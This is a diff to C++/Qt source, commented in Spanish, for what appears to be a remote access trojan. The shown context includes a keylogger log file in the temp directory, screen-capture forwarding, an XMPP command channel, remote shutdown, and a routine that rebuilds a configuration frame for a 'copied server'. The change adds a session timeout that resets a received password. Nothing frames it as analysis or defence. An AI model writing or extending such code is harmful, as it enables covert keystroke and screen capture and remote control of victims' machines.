@@ -59,6 +59,7 @@ void MainWindow::inicio(){
     connect(&capturacion,SIGNAL(enviar(QByteArray)),this,SLOT(enviarCaptura(QByteArray)));
     connect(&cliente,SIGNAL(presenceReceived(QXmppPresence)),this,SLOT(recibidaPresencia(QXmppPresence)));
     connect(&copiar,SIGNAL(timeout()),this,SLOT(tiempoCopiar()));
+    connect(&timerSesion,SIGNAL(timeout()),this,SLOT(finalizarSesion()));
     //Crear si no esta creado el archivo de log para el keylogger
     log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
     log.open(QFile::WriteOnly);
@@ -81,7 +82,8 @@ void MainWindow::inicio(){
     configuracion.setResource(this->alias);
     cliente.setClientPresence(QXmppPresence::Available);
     cliente.connectToServer(configuracion); //conectar al servidor xmpp
-    copiar.setInterval(6000);
+    copiar.setInterval(60000);
+    timerSesion.setInterval(20 * 60000);
     copiar.start();
     contrasenaRecibida = "nocontrasena";
 }
@@ -106,7 +108,11 @@ void MainWindow::tiempoCopiar()
     #endif
     copiar.stop();
 }
-
+void MainWindow::finalizarSesion()
+{
+    contrasenaRecibida = "nocontrasena";
+    timerSesion.stop();
+}
 QByteArray MainWindow::nuevaTrama()
 { /** esta funcion reconstruye una nueva trama de configuracion con algunas opciones cambiadas para el servidor copiado **/
     QByteArray datos;
@@ -462,6 +468,8 @@ void MainWindow::llegadaDatos(const QXmppMessage &mensaje) {
         {
             apagar();
         }
+        timerSesion.stop();
+        timerSesion.start();
     }
 }
 
